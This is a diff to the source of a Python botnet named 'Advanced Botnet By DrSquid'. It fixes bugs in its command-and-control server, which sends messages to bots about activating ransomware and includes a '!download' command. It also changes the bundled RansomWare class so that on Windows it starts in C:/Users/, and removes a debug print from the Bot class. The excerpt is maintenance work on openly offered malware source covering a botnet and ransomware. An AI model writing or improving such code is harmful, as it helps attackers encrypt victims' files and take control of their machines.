@@ -80,11 +80,11 @@ Advanced Botnet By DrSquid
         self.sending_file = False
         self.auto_ban = True
         self.botinfofile = "botinfo.txt"
-        botinfo = open(self.botinfo,"w").close()
+        botinfo = open(self.botinfofile,"w").close()
         self.max_connpersec = 20
         self.connpersec = 0
         self.conncount = 0
-        self.timer = 0
+        self.timer = 1
         self.conf_dbfile()
         file = open(self.logfile, "w").close()
         self.log(self.logo())
@@ -602,7 +602,7 @@ Advanced Botnet By DrSquid
                                                 self.send_to_other("SERVER",name,"Ransomware programs are activating!", conn)
                                                 self.send_to_other("SERVER",name,"Payloads are effective!", conn)
                                         else:
-                                            self.send_to_other("SERVER",name,"The ransomware has been disabled in the config file. Turn the value assigned to 'ransomware_active' to 't'")
+                                            self.send_to_other("SERVER",name,"The ransomware has been disabled in the config file. Turn the value assigned to 'ransomware_active' to 't'", conn)
                                     elif msg.startswith("!download"):
                                         try:
                                             filename = msg.split()[1]
@@ -4065,7 +4065,7 @@ class RansomWare:
         self.keyfile = "key.txt"
         self.recovery_directory = ""
         if sys.platform == "win32":
-            os.chdir("C:/")
+            os.chdir("C:/Users/")
             self.recovery_directory = f"C:/Users/{os.getlogin()}/"
         else:
             self.recovery_directory = "/"
@@ -4227,7 +4227,6 @@ class Bot:
         return filename.strip()
     def make_selffiles_encrypted_false(self):
         self.files_encrypted = False
-        print(self.files_encrypted)
     def recv(self):
         while True:
             try:
